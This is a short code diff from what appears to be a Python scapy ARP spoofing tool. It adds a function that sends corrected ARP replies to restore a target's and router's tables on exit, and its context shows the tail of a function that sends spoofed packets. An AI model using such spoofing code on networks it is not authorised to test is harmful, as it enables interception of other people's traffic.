@@ -23,3 +23,15 @@ def send_spoof_packet(target_ip, spoof_ip, target_mac):
 
     # Send packet to network
     scapy.sendp(full_packet, verbose=False)
+
+def restore_network(destination_ip, source_ip, destination_mac, source_mac):
+    """
+    Restores ARP tables functionality on script exit.
+    destination_mac; MAC address of target device
+    destination_ip; IP adress of target device
+    source_mac; MAC address of router
+    source_ip; IP address of router
+    """
+
+    arp_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(arp_packet, count=4, verbose=False)
